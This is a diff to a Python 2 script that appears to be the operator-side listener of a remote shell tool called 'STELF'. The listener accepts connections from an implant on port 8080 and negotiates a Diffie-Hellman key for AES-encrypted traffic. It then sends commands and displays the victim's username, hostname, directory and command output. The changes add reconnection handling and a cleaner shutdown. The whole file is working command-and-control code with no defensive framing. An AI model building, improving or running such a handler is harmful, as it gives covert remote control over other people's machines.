@@ -1,19 +1,22 @@
 #!/usr/bin/env python2
-import socket, sys, json, base64, random, hashlib
+import socket, sys, json, base64, random, hashlib, signal
 from Crypto.Cipher import AES
 
 class Handler:
 	def __init__(self, bind, port):
 		self.bind = bind
 		self.port = port
-                
-		self.cwd = "STELF CONNECTED"
-		self.prompt = self.cwd + ">> "
+				
+		self.cwd = "STELF Connected "
+		self.prompt = self.cwd + ">>"
 		self.server_sock = socket.socket()
+		self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
 		self.server_sock.bind((self.bind, self.port))
-		
+
 		self.commands = []
-		
+		signal.signal(signal.SIGINT, self.signal_handler)
+
 	def gen_diffie_key(self):
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
 		base = 2
@@ -37,7 +40,12 @@ class Handler:
 		
 	def decrypt(self, data):
 		return self.aes_obj.decrypt(base64.b64decode(data))
-		
+	  
+	def signal_handler(self, signal, frame):
+		print "\n\rBye Bye!"
+		self.server_sock.close()
+		sys.exit(0)
+
 	def send_cmd(self, command):
 		self.commands.append(command)
 		self.client_socket.sendall(self.encrypt(command))
@@ -47,37 +55,54 @@ class Handler:
 			self.prompt = data_package["localtime"] + " " +\
 							data_package["username"] + "@" +\
 							data_package["hostname"] + " " +\
-							data_package["cwd"] + ">> "
+							data_package["cwd"] + ">>"
 
 		else:
 			self.prompt = data_package["localtime"] + " " +\
 							data_package["username"] + " " +\
 							data_package["hostname"] + " " +\
-							data_package["cwd"] + ">> "
+							data_package["cwd"] + ">>"
 							
 		self.prompt = self.prompt.strip()
-
+		
 	def start(self):
-		self.server_sock.listen(5)
-		self.client_socket, _ = self.server_sock.accept()
-		
-		key, IV = self.gen_diffie_key()
-		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
-		
-		
 		while True:
-			user_input = raw_input("\n" + self.prompt)
+			self.server_sock.listen(5)
+			self.client_socket, _ = self.server_sock.accept()
+				
+			key, IV = self.gen_diffie_key()
+			self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
+				
+			self.interface()
+
+	def interface(self):
+		print "[*] Connection established! "
+		while True:
+			user_input = raw_input("\n" + self.prompt + " ")
 			if user_input == "help":
 				print "Available commands:\n prompt - change prompt"
-			self.send_cmd(user_input)
-			data = self.decrypt(self.client_socket.recv(4096))
-			data_package = json.loads(data)
-			for key in data_package:
-				data_package[key] = base64.b64decode(data_package[key])
+			else:
+				try:
+					self.send_cmd(user_input)
+					data = self.client_socket.recv(4096)		
+					if not data: raise Exception("[-] Client Disconnected")
+				
+					data = self.decrypt(data)
+				
+					data_package = json.loads(data)
+					for key in data_package:
+						data_package[key] = base64.b64decode(data_package[key])
 			
-			self.make_prompt(data_package)
+					self.make_prompt(data_package)
 			
-			sys.stdout.write(data_package["data"])
+					sys.stdout.write(data_package["data"])
+				
+				except Exception as e:
+						print "Something went wrong" 
+						print "[-] Broken pipe..."
+						print "[*] Attempting reconnection"
+						break
 
+							
 handler = Handler("0.0.0.0", 8080)
 handler.start()
